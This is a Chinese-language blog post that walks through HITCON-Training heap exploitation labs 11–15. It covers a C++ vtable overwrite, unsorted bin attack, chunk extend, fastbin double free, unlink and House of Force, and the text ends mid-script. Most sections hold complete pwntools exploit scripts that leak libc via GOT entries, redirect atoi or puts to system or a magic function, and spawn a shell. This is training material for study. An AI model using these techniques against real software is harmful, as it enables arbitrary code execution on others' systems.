<!DOCTYPE html><html lang="zh-cn"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title> HITCON-Training  - NO</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/favicon.ico"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://norw1nd.github.io/"><span>Norw1nd‘blog</span></a></li><li><a href="https://no4l.github.io/"><span>no4l’blog</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://callfiles.ueibo.com/hexo-theme-laughing/post_background.jpg"><div class="post-title"><h1 class="title"> HITCON-Training </h1><ul class="meta"><li><i class="icon icon-author"></i>会飞的鱼</li><li><i class="icon icon-clock"></i>41 Minutes</li><li><i class="icon icon-calendar"></i>January 28, 2019</li></ul></div></div><div class="article-content" style="max-width:800px"><p>链接：<a href="https://github.com/scwuaptx/HITCON-Training" target="_blank" rel="noopener">https://github.com/scwuaptx/HITCON-Training</a></p>
<p>[TOC]</p>
<h4 id="1-lab15"><a href="#1-lab15" class="headerlink" title="1.lab15"></a>1.lab15</h4><p>这是一个c++的堆溢出，ida反汇编的乱七八糟的，网上找了源码，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Dog : public Animal&#123;</span><br><span class="line">	public :</span><br><span class="line">		Dog(string str,int w)&#123;</span><br><span class="line">			strcpy(name,str.c_str());	</span><br><span class="line">			weight = w ;</span><br><span class="line">		&#125;</span><br><span class="line">		virtual void speak()&#123;</span><br><span class="line">			cout &lt;&lt; &quot;Wow ~ Wow ~ Wow ~&quot; &lt;&lt; endl ;</span><br><span class="line">		&#125;</span><br><span class="line">		virtual void info()&#123;</span><br><span class="line">			cout &lt;&lt; &quot;|---------------------|&quot; &lt;&lt; endl ;</span><br><span class="line">			cout &lt;&lt; &quot;| Animal info         |&quot; &lt;&lt; endl;</span><br><span class="line">			cout &lt;&lt; &quot;|---------------------|&quot; &lt;&lt; endl;</span><br><span class="line">			cout &lt;&lt; &quot;  Weight :&quot; &lt;&lt; this-&gt;weight &lt;&lt; endl ;</span><br><span class="line">			cout &lt;&lt; &quot;  Name : &quot; &lt;&lt; this-&gt;name &lt;&lt; endl ;</span><br><span class="line">			cout &lt;&lt; &quot;|---------------------|&quot; &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>strcpy(name,str.c_str())，在这里发生堆溢出，</p>
<p>涉及到虚表，详情可见<a href="http://showlinkroom.me/2017/08/21/C-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">链接</a></p>
<p>简要来说目的就是通过栈溢出使下图变为下下图，从而实现任意代码执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">+---------------+</span><br><span class="line">| vtable address|----+      vtable</span><br><span class="line">+---------------+    |      +------------+</span><br><span class="line">|    attrib     |    +-----&gt;|    func1   |</span><br><span class="line">+---------------+           +------------+</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+---------------+</span><br><span class="line">| fake address  |----+</span><br><span class="line">+---------------+    |          fake table</span><br><span class="line">|    attrib     |    |          +-----------+            +-------------+</span><br><span class="line">+---------------+    +---------&gt;|&amp;shellcode |-----------&gt;|  shellcode  |</span><br><span class="line">                                +-----------+            +-------------+</span><br></pre></td></tr></table></figure>
<p>在ida里跟踪，发现zoo的名字存在类似数组的位置</p>
<p><img src="/2019/01/28/HITCON-Training/2019-01-28 18_51_11-启动.png" alt=""></p>
<p>在ida中验证，果然是这样，所以可以在此处填入shellcode</p>
<p>添加两个动物，查看内存占用情况</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dog_add(&apos;a&apos;*8,0)</span><br><span class="line">dog_add(&apos;b&apos;*8,1)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/01/28/HITCON-Training/E:/blog\hexo\source\_posts\HITCON-Training\2019-01-28 18_55_23-启动.png" alt=""></p>
<p>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context(os=&quot;linux&quot;, arch=&quot;amd64&quot;,log_level = &quot;debug&quot;)</span><br><span class="line">elf = ELF(&quot;./zoo&quot;)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">p=process(&quot;./zoo&quot;)</span><br><span class="line">def dog_add(name,weight):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(weight))</span><br><span class="line">def remove(idx):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;5&quot;)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">def listen(idx):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">#shellcode=&quot;\x48\xb9\xff\xff\xff\xff\xff\xff\xff\xff\x49\xb8\xae\xb7\x72\xc3\xdb\xf0\xfa\xff\x49\x31\xc8\x41\x50\x49\xb8\xd0\x9d\x96\x91\xd0\xd0\x8c\x97\x49\x31\xc8\x41\x50\x49\xb8\xb7\xce\x2d\xad\x4f\xc4\xb7\x46\x49\x31\xc8\x41\x50\xff\xe4&quot;</span><br><span class="line">nameofzoo=0x605420</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(shellcode+p64(nameofzoo))</span><br><span class="line">dog_add(&apos;a&apos;*8,0)</span><br><span class="line">dog_add(&apos;b&apos;*8,1)</span><br><span class="line"></span><br><span class="line">remove(0)</span><br><span class="line">fake_vptr=nameofzoo+len(shellcode)</span><br><span class="line">dog_add(&quot;c&quot;*72+p64(fake_vptr),2)</span><br><span class="line">listen(0)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="2-lab14"><a href="#2-lab14" class="headerlink" title="2.lab14"></a>2.lab14</h4><p>unsortedbin attract</p>
<p>unsortedbin分配原则：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">         unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">         bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>
<p>所以我们尝试用堆溢出控制unsorted bin的bk指针</p>
<p>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">#context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p=process(&apos;magicheap&apos;)</span><br><span class="line"></span><br><span class="line">def create(size,context):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(context)</span><br><span class="line">def edit(idx,size,context):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(context)</span><br><span class="line">def delete(idx):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">magic=0x006020C0</span><br><span class="line"></span><br><span class="line">create(0x10,&apos;1111&apos;)</span><br><span class="line">create(0x80,&apos;bbbb&apos;)</span><br><span class="line">create(0x30,&apos;cccc&apos;)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">payload=&apos;d&apos;*0x10+p64(0)+p64(0x91)+p64(0)+p64(magic-0x10)</span><br><span class="line">edit(0,0x30,payload)</span><br><span class="line">create(0x80,&apos;bbbb&apos;)</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">p.sendline(&quot;4869&quot;)</span><br><span class="line">p.recvuntil(&apos;Congrt !\n&apos;)</span><br><span class="line">success(p.recvline())</span><br></pre></td></tr></table></figure>
<h3 id="3-lab-13"><a href="#3-lab-13" class="headerlink" title="3.lab 13"></a>3.lab 13</h3><p>chunk extend</p>
<p>堆结构如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct heap &#123;</span><br><span class="line">	size_t size ;</span><br><span class="line">	char *content ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>申请0x18和0x10两个堆块</p>
<p><img src="/2019/01/28/HITCON-Training/Inked2019-01-28 18_51_11启动_LI.jpg" alt=""></p>
<p>由于申请的空间要与0x10对齐，所以heap0的后0x8的空间被heap1复用</p>
<p>这里可以溢出一个字节，修改heap1的size为0x30</p>
<p><img src="/2019/01/28/HITCON-Training/2019-02-06 20_14_38-启动.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(heaparray[idx])&#123;</span><br><span class="line">		printf(&quot;Content of heap : &quot;);</span><br><span class="line">		read_input(heaparray[idx]-&gt;content,heaparray[idx]-&gt;size+1);</span><br><span class="line">puts(&quot;Done !&quot;);</span><br></pre></td></tr></table></figure>
<p>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">p = process(&apos;./heapcreator&apos;)</span><br><span class="line">elf = ELF(&apos;./heapcreator&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def create(size, content):</span><br><span class="line">    p.recvuntil(&apos;:&apos;)</span><br><span class="line">    p.sendline(&apos;1&apos;)</span><br><span class="line">    p.recvuntil(&apos;:&apos;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&apos;:&apos;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def edit(idx,context):</span><br><span class="line">    p.recvuntil(&apos;:&apos;)</span><br><span class="line">    p.sendline(&apos;2&apos;)</span><br><span class="line">    p.recvuntil(&apos;:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&apos;:&apos;)</span><br><span class="line">    p.sendline(context)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    p.recvuntil(&apos;:&apos;)</span><br><span class="line">    p.sendline(&apos;3&apos;)</span><br><span class="line">    p.recvuntil(&apos;:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    p.recvuntil(&apos;:&apos;)</span><br><span class="line">    p.sendline(&apos;4&apos;)</span><br><span class="line">    p.recvuntil(&apos;:&apos;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">atoi_got=elf.got[&apos;atoi&apos;]</span><br><span class="line"></span><br><span class="line">create(0x18,&apos;aaaa&apos;)</span><br><span class="line">create(0x10,&apos;bbbb&apos;)</span><br><span class="line">pay1=p64(0)*3+p64(0x41)   //修改heap1的size</span><br><span class="line">edit(0,pay1)</span><br><span class="line">delete(1)    //释放heap1，得到size分别为0x30和0x10的两个chunk</span><br><span class="line">pay2=&apos;a&apos;*0x20+p64(0x30)+p64(atoi_got)  //伪造0x30大小的chunk</span><br><span class="line">create(0x30,pay2)   //再次申请时优先分配刚释放的chunk，此时可以控制0x10chunk的指针</span><br><span class="line">show(1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Content : &quot;)</span><br><span class="line">data=p.recvuntil(&apos;Done !&apos;)</span><br><span class="line">atoi_addr=u64(data.split(&quot;\n&quot;)[0].ljust(8,&quot;\x00&quot;))</span><br><span class="line">libc_base=atoi_addr-libc.symbols[&apos;atoi&apos;]</span><br><span class="line">system_addr=libc_base+libc.symbols[&apos;system&apos;]</span><br><span class="line">edit(1,p64(system_addr))</span><br><span class="line">p.sendline(&apos;/bin/sh\00&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="4-lab-12"><a href="#4-lab-12" class="headerlink" title="4.lab 12"></a>4.lab 12</h3><p>Double Free，Fastbins Dup</p>
<p>学习链接：</p>
<p><a href="https://www.jianshu.com/p/1f06e40711a2" target="_blank" rel="noopener">https://www.jianshu.com/p/1f06e40711a2</a></p>
<p><a href="https://blog.csdn.net/z231288/article/details/71330912" target="_blank" rel="noopener">https://blog.csdn.net/z231288/article/details/71330912</a></p>
<p><a href="https://blog.csdn.net/qq_39153247/article/details/81878398" target="_blank" rel="noopener">https://blog.csdn.net/qq_39153247/article/details/81878398</a></p>
<p><a href="https://www.cnblogs.com/Ox9A82/p/5865420.html" target="_blank" rel="noopener">https://www.cnblogs.com/Ox9A82/p/5865420.html</a></p>
<p>0x601ffa处内存情况：</p>
<p><img src="/2019/01/28/HITCON-Training/2019-02-10 19_53_13-启动.png" alt=""></p>
<p>调试过程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">raiseflower(0x50,&quot;aaaa&quot;,&quot;red&quot;)#0</span><br><span class="line">raiseflower(0x50,&quot;bbbb&quot;,&quot;green&quot;)#1</span><br></pre></td></tr></table></figure>
<p><img src="/2019/01/28/HITCON-Training/1.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remove(0)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/01/28/HITCON-Training/2-.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remove(1)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/01/28/HITCON-Training/3.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">remove(0)</span><br></pre></td></tr></table></figure>
<p><img src="/2019/01/28/HITCON-Training/4.png" alt=""></p>
<p>exp：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = process(&apos;./secretgarden&apos;)</span><br><span class="line"></span><br><span class="line">def raiseflower(length,name,color):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(name)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(color)</span><br><span class="line"></span><br><span class="line">def visit():</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">def remove(idx):</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;3&quot;)</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def clean():</span><br><span class="line">    r.recvuntil(&quot;:&quot;)</span><br><span class="line">    r.sendline(&quot;4&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic = 0x400c7b   magic函数地址</span><br><span class="line">fake_chunk = 0x601ffa   目标地址，这个地址恰好有符合fastbin范围的大小，故在此伪造chunk</span><br><span class="line">raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)#0</span><br><span class="line">raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)#1</span><br><span class="line">//double free </span><br><span class="line">remove(0)  chunk0进入fastbins链表的第一个，不可以再次free</span><br><span class="line">remove(1)  chunk1成为fastbins链表的第一个，fd指针指向chunk0</span><br><span class="line">remove(0)  hunk0进入fastbins链表的第一个，fd指向chunk1</span><br><span class="line">raiseflower(0x50,p64(fake_chunk),&quot;blue&quot;)</span><br><span class="line">raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)</span><br><span class="line">raiseflower(0x50,&quot;da&quot;,&quot;red&quot;)</span><br><span class="line">//目的是将put_got的地址换成magic</span><br><span class="line">raiseflower(0x50,&quot;a&quot;*6 + p64(0) + p64(magic)*2 ,&quot;red&quot;)//malloc in fake_chunk</span><br><span class="line">//这里p64(0) + p64(magic)*2或p64(0)*2 + p64(magic)都可以</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="5-lab11"><a href="#5-lab11" class="headerlink" title="5 lab11"></a>5 lab11</h3><p>unlink</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">p=process(&apos;./bamboobox&apos;)</span><br><span class="line">elf=ELF(&apos;./bamboobox&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;1&quot;)</span><br><span class="line">def add(len,item):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(len))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(item)</span><br><span class="line">def change(idx,len,item):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(len))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(item)</span><br><span class="line">def remove(idx):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;4&quot;)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">head=0x6020c8</span><br><span class="line">fd=head-0x18</span><br><span class="line">bk=head-0x10</span><br><span class="line">atoi_got=elf.got[&apos;atoi&apos;]</span><br><span class="line"></span><br><span class="line">add(0x80,&apos;aaaa&apos;)   //大小在8-0x80之外，否则free后归入fastbins</span><br><span class="line">add(0x80,&apos;bbbb&apos;)</span><br><span class="line">add(0x50,&apos;cccc&apos;)  //大小随便</span><br><span class="line"></span><br><span class="line">fake_chunk=p64(0)+p64(0x80)+p64(fd)+p64(bk)</span><br><span class="line">fake_chunk=fake_chunk.ljust(0x80,&apos;A&apos;)</span><br><span class="line">fake_chunk+=p64(0x80)+p64(0x90)</span><br><span class="line"></span><br><span class="line">change(0,0x90,fake_chunk)</span><br><span class="line">remove(1)</span><br><span class="line"></span><br><span class="line">pay=p64(0)*3  //从head-0x18开始填充</span><br><span class="line">pay+=p64(atoi_got)</span><br><span class="line">change(0,0x80,pay)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;0 : &quot;)</span><br><span class="line">atoi_addr=u64(p.recvuntil(&quot;:&quot;)[:6].ljust(8,&quot;\x00&quot;))</span><br><span class="line">libc_base=atoi_addr-libc.symbols[&apos;atoi&apos;]</span><br><span class="line">system_addr=libc_base+libc.symbols[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change(0,0x80,p64(system_addr)) //从head开始填充</span><br><span class="line">p.recvuntil(&quot;:&quot;)</span><br><span class="line">#p.sendline(&quot;$0&quot;)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>House of Force</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">p=process(&apos;./bamboobox&apos;)</span><br><span class="line">elf=ELF(&apos;./bamboobox&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">def add(len,item):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;2&quot;)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(len))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(item)</span><br><span class="line">def change(idx,len,item):</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(&quot;3&quot;)</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(str(len))</span><br><span class="line">    p.recvuntil(&quot;:&quot;)</span><br><span class="line">    p.sendline(item)</span><br><span class="line"></span><br><span class="line">magic=0x00400D49 </span><br><span class="line"></span><br><span class="line">add(0x30,&apos;aaaa&apos;)</span><br><span class="line">pay=&apos;a&apos;*0x30+p64(0)+p64(0xffffffffffffffff)   //0xffffffffffffffff为-1的补码</span><br><span class="line">change(0,0x40,pay)</span><br><span class="line"></span><br><span class="line">fchunk_size=-0x40-0x20-0x10  //chunk+topchunk+pre_size+size</span><br><span 